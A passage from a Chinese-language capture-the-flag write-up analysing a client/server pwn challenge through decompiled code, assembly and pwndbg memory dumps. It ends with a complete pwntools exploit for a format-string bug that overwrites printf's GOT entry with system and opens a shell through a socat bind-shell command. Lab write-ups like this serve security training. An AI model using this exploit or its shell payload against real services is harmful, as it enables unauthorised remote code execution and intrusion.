      void *ptr; // [rsp+38h] [rbp-18h]
      _DWORD *buf; // [rsp+40h] [rbp-10h]
      signed int v9; // [rsp+4Ch] [rbp-4h]
      src = a3;
      n = a4;
      v9 = a4 + 8;
      buf = malloc(a4 + 8LL);
      ptr = buf;
      *buf = n;
      buf[1] = a2;
      memcpy(buf + 2, src, n);
      while ( v9 > 0 )
      {
        v6 = write(*a1, buf, v9);
        if ( v6     call   process_message 
            rdi: 0x7fffffffe040 ◂— 0x4
            rsi: 0x6d8590 ◂— 0x7
    pwndbg> x/4gx 0x6d8590
    0x6d8590:       0x0000000000000007      0x00000000006d6480
    0x6d85a0:       0x0000000000000000      0x0000001200000000   
    pwndbg> x/4gx 0x00000000006d6480
    0x6d6480:       0x000000000000000a      0x3232313131310404
    0x6d6490:       0x0000000000003232      0x0000000000000031
可见`process_message`的`v5 = *((_QWORD *)a2 + 1)`就是client发的数据包。现在需要分析一下`if (
*(_QWORD *)&a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2]
)`是干什么的？直接看一下汇编，不难发现`rdx`的值为`send_data->action`的值，也就是`send_msg`的第二个参数。
    .text:0000000000404CA9 ; 7:   v5 = *((_QWORD *)a2 + 1);                     // send_data
    .text:0000000000404CA9                 mov     rax, [rbp+var_20]
    .text:0000000000404CAD                 mov     rax, [rax+8]
    .text:0000000000404CB1                 mov     [rbp+var_8], rax
    .text:0000000000404CB5 ; 8:   if ( *(_QWORD *)&a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2] )
    .text:0000000000404CB5                 mov     rax, [rbp+var_8]
    .text:0000000000404CB9                 mov     edx, [rax+4]   ;; send_data->action
    .text:0000000000404CBC                 mov     rax, [rbp+var_20]
    .text:0000000000404CC0                 mov     edx, edx
    .text:0000000000404CC2                 add     rdx, 4
    .text:0000000000404CC6                 mov     rax, [rax+rdx*8+8]
    .text:0000000000404CCB                 test    rax, rax
同时检查一下`a2`中存放了什么数据，根据调试的结果，可以推测`send_msg`的第二个参数用于选择对应的功能模块，而`action=0`就是login的操作。
    pwndbg> x/32gx 0x6d8590
    0x6d8590:       0x0000000000000007      0x00000000006d6480
    0x6d85a0:       0x0000000000000000      0x0000001200000000
    0x6d85b0:       0x0000000000000012      0x0000000000405445
    0x6d85c0:       0x0000000000000000      0x0000000000405c96
    0x6d85d0:       0x0000000000000000      0x0000000000000000
    0x6d85e0:       0x0000000000000000      0x0000000000000000
    0x6d85f0:       0x0000000000000000      0x0000000000000000
    0x6d8600:       0x0000000000000000      0x0000000000000000
    0x6d8610:       0x0000000000000000      0x0000000000000000
    pwndbg> x 0x0000000000405445
    0x405445 :       0x70ec8348e5894855
    pwndbg> x 0x0000000000405c96
    0x405c96 :      0x40ec8348e5894855
那么只要我们根据client登录数据包的结构，构造一个数据包，控制`send_data`的`action`参数，让`[rax+rdx*8+8]`落在空白处，程序就会判断不存在该功能，并进入`else`分支，到格式化字符串漏洞的地方。现在，可以不用管client了，直接构造一个`action`大于2的数据包进行调试，代码修改如下：
    from pwn import *
    p = remote('127.0.0.1', 6210)
    def send_payload(action, payload):
        p.send(p32(len(payload)) + p32(action) + payload)
    send_payload(3,'aaaaaaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
    p.interactive()
发现输入的数据包存在栈中，那么利用就很简单了。接着就是常规的格式化字符串漏洞利用套路，修改`PI:EMAIL`为`system@plt`。
尝试了各种的反弹shell姿势都无效，用curl和wget回传flag也没反应，最后用socat开了一个正向shell，成功连上~
完整exp：
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = 'DEBUG' 
    elf = ELF('./server')
    p = remote('172.30.0.2', 6210)
    def send_payload(action, payload):
        p.send(p32(len(payload)) + p32(action) + payload)
    payload = ''
    byte = []
    offset = 15
    for x in range(6): 
        a = elf.got['printf'] + x
        b = elf.plt['system'] >> 8 * x  & 0xff
        byte.append((b,a))
    byte.sort(key=lambda x:x[0],reverse=False)
    count = 0
    n = 0
    for y in byte:
        tmp = y[0]-count
        if tmp < 0: tmp += 256
        if tmp == 0:
            payload += '%{}$hhn'.format(offset+9+n)
        else:
            payload += '%{}c%{}$hhn'.format(tmp,offset+9+n)
        count += tmp
        n += 1
    payload = payload.ljust(72,'a')
    for z in byte:
        payload += p64(z[1])
    send_payload(3,payload)
    send_payload(3,'socat TCP-LISTEN:23333,reuseaddr,fork EXEC:"/bin/sh"\x00')
    p.close()
## 总结
VeggieTales是一个常规的pickle反序列化，以往CTF一般是放在web题中。pwn6的server/client题型很新颖，虽然漏洞利用不难，不过调试过程还是踩了不少坑，题目质量不错，值得学习一下。